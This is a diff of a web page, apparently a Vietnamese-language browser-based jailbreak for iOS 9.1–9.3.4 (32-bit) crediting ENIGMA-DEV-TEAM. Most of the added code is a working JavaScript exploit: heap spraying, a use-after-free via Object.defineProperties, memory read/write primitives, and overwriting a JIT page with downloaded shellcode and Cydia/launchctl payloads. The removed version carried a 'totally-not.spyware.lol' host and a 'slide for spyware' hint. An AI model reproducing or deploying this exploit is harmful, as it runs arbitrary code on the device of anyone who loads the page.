@@ -1,38 +1,347 @@
 
-<!DOCTYPE html>
-<html lang="en" manifest="manifest.appcache">
-<title>totaly</title>
-<meta charset="utf-8">
-<!-- UI Properties -->
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<link rel="stylesheet" type="text/css" href="all.css">
-<!-- iOS App Properties -->
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black">
-<link rel="apple-touch-icon" href="img/ios-icon.png">
+
+<style>
+ body {
+ overflow: hidden;
+ position: fixed;
+ position: relative;
+ }
+ h1{
+ overflow: hidden;
+ position: fixed;
+ position: absolute;
+ top: 30%;
+ left: 50%;
+ transform: translate(-50%, -50%);
+ }
+
+ </style>
+ <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/>
+</head>
+<body>
 <script>
-window.onerror = function(ev)
-{
-    alert('Uncaught error: ' + ev);
-};
+function load_binary_resource(url) {
+  var req = new XMLHttpRequest();
+  req.open('GET', url, false);
+  req.overrideMimeType('text\/plain; charset=x-user-defined');
+  req.send(null);
+  if (req.status != 200) {
+    stop=1;
+  }
+  return req.responseText;
+}
+
+filestream = "LOADING";
+payload_tar = "LOADING";
+payload_cydia = "LOADING";
+payload_launchctl = "LOADING";
+payload_offsets = "LOADING";
+
+var pressure = new Array(400);
+var bufs = new Array(10000);
+
+
+var fcp = 0;
+var smsh = new Uint32Array(0x10);
+
+var trycatch = "";
+for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
+var fc = new Function(trycatch);
+
+function getArrFromResource(res){
+  while (res.length % 4){
+    res += "A";
+  }
+  var ret = new Uint32Array(res.length/4);
+  for(var i = 0; i < res.length; i+=4){
+    var word = (res.charCodeAt(i) & 0xff) | ((res.charCodeAt(i+1) & 0xff) << 8)  | ((res.charCodeAt(i+2) & 0xff) << 16)  | ((res.charCodeAt(i+3) & 0xff) << 24);
+    ret[i/4] = word;
+  }
+  return ret;
+}
+
+function swag() {
+	if(bufs[0]) return;
+
+	dgc();
+
+	for (i=0; i < bufs.length; i++) {
+    bufs[i] = new Uint32Array(0x100*2)
+		for (k=0; k < bufs[i].length; )
+		{
+			bufs[i][k++] = 0x41414141;
+			bufs[i][k++] = 0xffff0000;
+		}
+	}
+  console.log("doneswag");
+}
+
+function smashed(stale,tar_ptr,cydia_ptr,launchctl_ptr,offsets_ptr) {
+  console.log("smsh len="+smsh.length);
+
+  console.log("fcp=0x"+fcp.toString(16));
+  console.log("binfile=0x"+binfile.toString(16));
+
+
+  // getJIT
+  r2 = smsh[(fcp+0x14)/4];
+  r3 = smsh[(r2+0x10)/4];
+  shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
+  console.log("r2=0x"+r2.toString(16));
+  console.log("r3=0x"+r3.toString(16));
+  console.log("shellcode=0x"+shellcode.toString(16));
+
+  console.log("Plant payload3="+offsets_ptr.toString(16));
+  smsh[shellcode/4] = offsets_ptr;
+  shellcode += 4;
+
+  console.log("Plant payload2="+launchctl_ptr.toString(16));
+  smsh[shellcode/4] = launchctl_ptr;
+  shellcode += 4;
+
+  console.log("Plant payload1="+cydia_ptr.toString(16));
+  smsh[shellcode/4] = cydia_ptr;
+  shellcode += 4;
+
+  console.log("Plant payload0="+tar_ptr.toString(16));
+  smsh[shellcode/4] = tar_ptr;
+  shellcode += 4;
+
+  for(var i = 0; i < filestream.length; i+=4)
+  {
+    var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
+    smsh[(shellcode+i)/4] = word;
+  }
+
+  smsh[(fcp+0x00)/4] = fcp+4;
+  smsh[(fcp+0x04)/4] = fcp+4;
+  smsh[(fcp+0x08)/4] = shellcode+1; //PC
+  smsh[(fcp+0x30)/4] = fcp+0x30+4-0x18-0x34+0x8;
+
+
+  console.log("Do fc() smashed");
+  fc();
+
+  console.log("end smashed");
+}
+
+function sleep(delay) {
+    var start = new Date().getTime();
+    while (new Date().getTime() < start + delay);
+}
+
+dgc = function() {
+  console.log("dgc start");
+	for (var i = 0; i < pressure.length; i++) {
+    pressure[i] = new Uint32Array(0xa000);
+	}
+  // sleep(1000);
+  console.log("dgc done");
+}
+dgcf = function() {
+  console.log("dgcf start");
+	for (var i = 0; i < pressure.length; i++) {
+		pressure[i] = 0
+	}
+  console.log("dgcf done");
+}
+
+go = function(){
+  console.log("going");
+  document.getElementById('bigButton').innerHTML = "Chạy jailbreak";
+  setTimeout(go_, 100);
+}
+
+function swag() {
+	if(bufs[0]) return;
+
+	dgc();
+
+	for (i=0; i < bufs.length; i++) {
+		bufs[i] = new Uint32Array(0x100*2)
+		for (k=0; k < bufs[i].length; )
+		{
+			bufs[i][k++] = 0x41414141;
+			bufs[i][k++] = 0xffff0000;
+		}
+	}
+}
+
+var binfile = 0;
+var mem0=0;
+var mem1=0;
+var mem2=0;
+
+_dview = null;
+function u2d(low, hi) {
+    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+    _dview.setUint32(0, hi);
+    _dview.setUint32(4, low);
+    return _dview.getFloat64(0);
+}
+
+function d2u(f) {
+    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+    _dview.setFloat64(0,f);
+    return _dview.getUint32(0);
+}
+
+function go_(){
+  var arr = new Array(2047);
+  var not_number = {};
+  not_number.toString = function() {
+  	arr = null;
+  	props["stale"]["value"] = null;
+    swag();
+  	return 10;
+  };
+
+  smsh[0] = 0x21212121;
+  smsh[1] = 0x31313131;
+  smsh[2] = 0x41414141;
+  smsh[3] = 0x51515151;
+  smsh[4] = 0x61616161;
+  smsh[5] = 0x71717171;
+  smsh[6] = 0x81818181;
+  smsh[7] = 0x91919191;
+
+  var props = {
+  	p0 : { value : 0 },
+  	p1 : { value : 1 },
+  	p2 : { value : 2 },
+  	p3 : { value : 3 },
+  	p4 : { value : 4 },
+  	p5 : { value : 5 },
+  	p6 : { value : 6 },
+  	p7 : { value : 7 },
+  	p8 : { value : 8 },
+  	length : { value : not_number },
+  	stale : { value : arr },
+  	after : { value : 666 }
+  };
+
+  var target = [];
+  var stale = 0;
+  var before_len = arr.length;
+  console.log("before="+before_len);
+  Object.defineProperties(target, props);
+  stale = target.stale;
+  console.log("after="+stale.length);
+
+  if (stale.length != 0x41414141){
+    alert("Thiết bị của bạn đã jailbreak thất bại.Hãy thử lại");
+    location.reload();
+    return;
+  }
+
+  var obuf = new Uint32Array(2);
+  obuf[0] = 0x41414141;
+  obuf[1] = 0xffff0000;
+
+  stale[0] = 0x12345678;
+  stale[1] = {};
+
+
+  for(var z=0; z<0x100; z++) fc();
+
+  console.log("pre array");
+  for (i=0; i < bufs.length; i++) {
+    var dobreak = 0;
+    for (k=0; k < bufs[0].length; k++){
+  	   if(bufs[i][k] != obuf[k%2]){
+
+        console.log("bufs[i][k]  =0x"+bufs[i][k].toString(16));
+        console.log("bufs[i][k+1]=0x"+bufs[i][k+1].toString(16));
+
+        stale[0] = fc;
+        fcp = bufs[i][k];
+
+        stale[0] = filestream;
+        binfile = bufs[i][k];
+
+        stale[0] = payload_tar;
+        var payload_tar_ptr = bufs[i][k];
+
+        stale[0] = payload_cydia;
+        var payload_cydia_ptr = bufs[i][k];
+
+        stale[0] = payload_launchctl;
+        var payload_launchctl_ptr = bufs[i][k];
+
+        stale[0] = payload_offsets;
+        var payload_offsets_ptr = bufs[i][k];
+
+        stale[0] = smsh;
+        var ptrsmsh = bufs[i][k];
+
+        stale[2] = {'a':u2d(0x2,0x10),'b':smsh, 'c':u2d(0,0), 'd':u2d(0,0)}
+        stale[0] = {'a':u2d(0,0x00e00600),'b':u2d(1,0x10), 'c':u2d(bufs[i][k+2*2]+0x10,0), 'd':u2d(0,0)}
+        stale[1] = stale[0];
+        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+        var leak = stale[0][0].charCodeAt(0);
+            leak += stale[0][1].charCodeAt(0) << 8;
+            leak += stale[0][2].charCodeAt(0) << 16;
+            leak += stale[0][3].charCodeAt(0) << 24;
+        console.log("leakptr=0x"+leak.toString(16));
+        bufs[i][k] -= 0x10;
+        stale[0] = {'a':u2d(leak,0x00602300), 'b':u2d(0,0), 'c':smsh, 'd':u2d(0,0)}
+        stale[1] = stale[0];
+        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+        stale[0][4] = 0;
+        stale[0][5] = 0xffffffff;
+        bufs[i][k] -= 0x10;
+
+        mem0 = stale[0];
+        mem2 = smsh;
+        if (smsh.length != 0x10) {
+
+          document.getElementById('bigButton').innerHTML = "Run e"
+          setTimeout(function () {
+              smashed(stale,payload_tar_ptr,payload_cydia_ptr,payload_launchctl_ptr,payload_offsets_ptr);
+            }, 100);
+        }
+
+        dobreak = 1;
+        break;
+       }
+     }
+     if (dobreak) break;
+   }
+
+  console.log("end");
+}
+
+function loadRes(){
+  console.log("Đang tải Resources");
+  document.getElementById('bigButton').innerHTML = "Chạy khai thác 1"
+  setTimeout(function () {
+    filestream = load_binary_resource("stage1.bin")
+    payload_tar = getArrFromResource(load_binary_resource("payload/tar"))
+    payload_launchctl = getArrFromResource(load_binary_resource("payload/launchctl"))
+    payload_offsets = getArrFromResource(load_binary_resource("payload/offsets.json"))
+
+    document.getElementById('bigButton').innerHTML = "Chạy khai thác 2"
+    setTimeout(function () {
+        payload_cydia = getArrFromResource(load_binary_resource("payload/Cydia.tar"))
+        go();
+        }, 100);
+      }, 100);
+}
 </script>
-  <script src="all.js"></script>
-<script src="pwn.js"></script>
-<body class="crazycolors">
-    <header class="block">
-      <div class="go">Jailbreak </div>
-<strong>ios 10.3 &rarr; 10.3.3 (64-bit)
-  </storng>    </header>
- 
-    <div id="slider">
-        <div id="well">
-            <div id="thumbtack">
-                <img class="arrow" src="https://totally-not.spyware.lol/img/arrow.svg" alt="arrow">
-            </div>
-            <div id="hint">
-                <span>slide for spyware</span>
-            </div>
-        </div>
+
+<center>JAILBREAK-GO<br>
+  iOS 9.1 - iOS 9.3.4 (32bit)
+  <div id="stuff">
+    <div id="bigButton" style="font-size:42px;font-family: Arial Black,Arial Bold,Gadget,sans-serif">
+      <a href="javascript:loadRes()">jailbreak!</a>
     </div>
+    <br>
+    <div id="shasums">
+  </div>
+  <br>
+bởi <a href="https://twitter.com/iamIKY2">@I K Y</a>,@MRX,@Duyvsh của ENIGMA-DEV-TEAM<br>
+<img src="data:image/png;base64,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"</a><br>
+</center>
 </body>
 </html>
+
